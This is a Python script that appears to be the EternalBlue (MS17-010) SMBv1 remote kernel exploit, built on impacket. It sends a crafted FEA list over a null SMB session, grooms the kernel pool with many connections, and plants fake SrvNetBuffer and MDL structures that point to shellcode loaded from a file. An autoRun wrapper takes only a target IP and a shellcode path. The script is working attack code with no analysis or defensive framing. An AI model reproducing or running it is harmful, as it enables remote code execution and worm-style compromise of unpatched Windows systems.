#!/usr/bin/python
from impacket import smb
from struct import pack
import sys
import socket

NTFEA_SIZE = 0x11000
ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A' * 0xffde
ntfea11000 = (pack('<BBH', 0, 0, 0) + '\x00') * 600  # with these fea, ntfea size is 0x1c20
ntfea11000 += pack('<BBH', 0, 0, 0xf3bd) + 'A' * 0xf3be  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc
ntfea1f000 = (pack('<BBH', 0, 0, 0) + '\x00') * 0x2494  # with these fea, ntfea size is 0x1b6f0
ntfea1f000 += pack('<BBH', 0, 0, 0x48ed) + 'A' * 0x48ee  # 0x1ffe8 - 0x1b6f0 - 0xc = 0x48ec
ntfea = {0x10000: ntfea10000, 0x11000: ntfea11000}

TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000

fakeSrvNetBufferNsa = pack('<II', 0x11000, 0) * 2
fakeSrvNetBufferNsa += pack('<HHI', 0xffff, 0, 0) * 2
fakeSrvNetBufferNsa += '\x00' * 16
fakeSrvNetBufferNsa += pack('<IIII', TARGET_HAL_HEAP_ADDR_x86 + 0x100, 0, 0, TARGET_HAL_HEAP_ADDR_x86 + 0x20)
fakeSrvNetBufferNsa += pack('<IIHHI', TARGET_HAL_HEAP_ADDR_x86 + 0x100, 0, 0x60, 0x1004,0)  # _, x86 MDL.Next, .Size, .MdlFlags, .Process
fakeSrvNetBufferNsa += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86 - 0x80, 0,TARGET_HAL_HEAP_ADDR_x64)  # x86 MDL.MappedSystemVa, _, x64 pointer to fake struct
fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64 + 0x100, 0)  # x64 pmdl2
fakeSrvNetBufferNsa += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 - 0x80)  # MDL.Process, MDL.MappedSystemVa
fakeSrvNetBufferX64 = pack('<II', 0x11000, 0) * 2
fakeSrvNetBufferX64 += pack('<HHIQ', 0xffff, 0, 0, 0)
fakeSrvNetBufferX64 += '\x00' * 16
fakeSrvNetBufferX64 += '\x00' * 16
fakeSrvNetBufferX64 += '\x00' * 16  # 0x40
fakeSrvNetBufferX64 += pack('<IIQ', 0, 0, TARGET_HAL_HEAP_ADDR_x64)  # _, _, pointer to fake struct
fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64 + 0x100, 0)  # pmdl2
fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 - 0x80)  # MDL.Process, MDL.MappedSystemVa

fakeSrvNetBuffer = fakeSrvNetBufferNsa

feaList = pack('<I',
               0x10000)  # the value of feaList size MUST be >=0x10000 to trigger bug (but must be less than data size)
feaList += ntfea[NTFEA_SIZE]
feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer) - 1) + fakeSrvNetBuffer  # -1 because first '\x00' is for name
feaList += pack('<BBH', 0x12, 0x34, 0x5678)

fake_recv_struct = pack('<QII', 0, 3, 0)
fake_recv_struct += '\x00' * 16
fake_recv_struct += pack('<QII', 0, 3, 0)
fake_recv_struct += ('\x00' * 16) * 7
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64 + 0xa0,
                         TARGET_HAL_HEAP_ADDR_x64 + 0xa0)  # offset 0xa0 (LIST_ENTRY to itself)
fake_recv_struct += '\x00' * 16
fake_recv_struct += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86 + 0xc0, TARGET_HAL_HEAP_ADDR_x86 + 0xc0, 0)  # x86 LIST_ENTRY
fake_recv_struct += ('\x00' * 16) * 11
fake_recv_struct += pack('<QII', 0, 0, TARGET_HAL_HEAP_ADDR_x86 + 0x190)  # fn_ptr array on x86
fake_recv_struct += pack('<IIQ', 0, TARGET_HAL_HEAP_ADDR_x86 + 0x1f0 - 1, 0)  # x86 shellcode address
fake_recv_struct += ('\x00' * 16) * 3
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64 + 0x1e0)  # offset 0x1d0: KSPINLOCK, fn_ptr array
fake_recv_struct += pack('<QQ', 0,
                         TARGET_HAL_HEAP_ADDR_x64 + 0x1f0 - 1)  # x64 shellcode address - 1 (this value will be increment by one)

def autoRun(ip,shellcode):
    def getNTStatus(self):
        return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']

    setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)

    def sendEcho(conn, tid, data):
        pkt = smb.NewSMBPacket()
        pkt['Tid'] = tid

        transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
        transCommand['Parameters'] = smb.SMBEcho_Parameters()
        transCommand['Data'] = smb.SMBEcho_Data()

        transCommand['Parameters']['EchoCount'] = 1
        transCommand['Data']['Data'] = data
        pkt.addCommand(transCommand)

        conn.sendSMB(pkt)
        recvPkt = conn.recvSMB()

    def createSessionAllocNonPaged(target, size):
        conn = smb.SMB(target, target)
        _, flags2 = conn.get_flags()
        flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY

        if size >= 0xffff:
            flags2 &= ~smb.SMB.FLAGS2_UNICODE
            reqSize = size // 2
        else:
            flags2 |= smb.SMB.FLAGS2_UNICODE
            reqSize = size
        conn.set_flags(flags2=flags2)

        pkt = smb.NewSMBPacket()

        sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()

        sessionSetup['Parameters']['MaxBufferSize'] = 61440  # can be any value greater than response size
        sessionSetup['Parameters']['MaxMpxCount'] = 2  # can by any value
        sessionSetup['Parameters']['VcNumber'] = 2  # any non-zero
        sessionSetup['Parameters']['SessionKey'] = 0
        sessionSetup['Parameters'][
            'SecurityBlobLength'] = 0  # this is OEMPasswordLen field in another format. 0 for NULL session
        sessionSetup['Parameters']['Capabilities'] = smb.SMB.CAP_EXTENDED_SECURITY  # can add other flags

        sessionSetup['Data'] = pack('<H', reqSize) + '\x00' * 20
        pkt.addCommand(sessionSetup)

        conn.sendSMB(pkt)
        recvPkt = conn.recvSMB()
        return conn

    class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
        structure = (
            ('TotalParameterCount', '<H=0'),
            ('TotalDataCount', '<H'),
            ('ParameterCount', '<H=0'),
            ('ParameterOffset', '<H=0'),
            ('ParameterDisplacement', '<H=0'),
            ('DataCount', '<H'),
            ('DataOffset', '<H'),
            ('DataDisplacement', '<H=0'),
            ('FID', '<H=0'),
        )


    def send_trans2_second(conn, tid, data, displacement):
        pkt = smb.NewSMBPacket()
        pkt['Tid'] = tid

        transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
        transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
        transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
        transCommand['Parameters']['TotalParameterCount'] = 0
        transCommand['Parameters']['TotalDataCount'] = len(data)
        fixedOffset = 32 + 3 + 18
        transCommand['Data']['Pad1'] = ''
        transCommand['Parameters']['ParameterCount'] = 0
        transCommand['Parameters']['ParameterOffset'] = 0

        if len(data) > 0:
            pad2Len = (4 - fixedOffset % 4) % 4
            transCommand['Data']['Pad2'] = '\xFF' * pad2Len
        else:
            transCommand['Data']['Pad2'] = ''
            pad2Len = 0

        transCommand['Parameters']['DataCount'] = len(data)
        transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
        transCommand['Parameters']['DataDisplacement'] = displacement

        transCommand['Data']['Trans_Parameters'] = ''
        transCommand['Data']['Trans_Data'] = data
        pkt.addCommand(transCommand)

        conn.sendSMB(pkt)


    def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
        pkt = smb.NewSMBPacket()
        pkt['Tid'] = tid

        command = pack('<H', setup)

        transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
        transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
        transCommand['Parameters']['MaxSetupCount'] = 1
        transCommand['Parameters']['MaxParameterCount'] = len(param)
        transCommand['Parameters']['MaxDataCount'] = 0
        transCommand['Data'] = smb.SMBTransaction2_Data()
        transCommand['Parameters']['Setup'] = command
        transCommand['Parameters']['TotalParameterCount'] = len(param)
        transCommand['Parameters']['TotalDataCount'] = len(data)

        fixedOffset = 32 + 3 + 38 + len(command)
        if len(param) > 0:
            padLen = (4 - fixedOffset % 4) % 4
            padBytes = '\xFF' * padLen
            transCommand['Data']['Pad1'] = padBytes
        else:
            transCommand['Data']['Pad1'] = ''
            padLen = 0

        transCommand['Parameters']['ParameterCount'] = len(param)
        transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

        if len(data) > 0:
            pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
            transCommand['Data']['Pad2'] = '\xFF' * pad2Len
        else:
            transCommand['Data']['Pad2'] = ''
            pad2Len = 0

        transCommand['Parameters']['DataCount'] = firstDataFragmentSize
        transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

        transCommand['Data']['Trans_Parameters'] = param
        transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
        pkt.addCommand(transCommand)

        conn.sendSMB(pkt)
        conn.recvSMB()  # must be success

        i = firstDataFragmentSize
        while i < len(data):
            sendSize = min(4096, len(data) - i)
            if len(data) - i <= 4096:
                if not sendLastChunk:
                    break
            send_trans2_second(conn, tid, data[i:i + sendSize], i)
            i += sendSize

        if sendLastChunk:
            conn.recvSMB()
        return i

    def createConnectionWithBigSMBFirst80(target):
        sk = socket.create_connection((target, 445))
        pkt = '\x00' + '\x00' + pack('>H', 0xfff7)
        pkt += 'BAAD'  # can be any
        pkt += '\x00' * 0x7c
        sk.send(pkt)
        return sk

    def exploit(target, shellcode, numGroomConn):
        conn = smb.SMB(target, target)
        conn.login_standard('', '')
        server_os = conn.get_server_os()
        if not (server_os.startswith("Windows 7 ") or (
                server_os.startswith("Windows Server ") and ' 2008 ' in server_os) or server_os.startswith(
            "Windows Vista")):
            pass
        tid = conn.tree_connect_andx('\\\\' + target + '\\' + 'IPC$')

        progress = send_big_trans2(conn, tid, 0, feaList, '\x00' * 30, 2000, False)
        allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)

        srvnetConn = []
        for i in range(numGroomConn):
            sk = createConnectionWithBigSMBFirst80(target)
            srvnetConn.append(sk)
        holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10)
        allocConn.get_socket().close()

        for i in range(5):
            sk = createConnectionWithBigSMBFirst80(target)
            srvnetConn.append(sk)

        holeConn.get_socket().close()

        send_trans2_second(conn, tid, feaList[progress:], progress)

        recvPkt = conn.recvSMB()
        retStatus = recvPkt.getNTStatus()
        for sk in srvnetConn:
            sk.send(fake_recv_struct + shellcode)

        for sk in srvnetConn:
            sk.close()

        conn.disconnect_tree(tid)
        conn.logoff()
        conn.get_socket().close()

    TARGET = ip
    numGroomConn = 13

    fp = open(shellcode, 'rb')
    sc = fp.read()
    fp.close()

    exploit(TARGET, sc, numGroomConn)
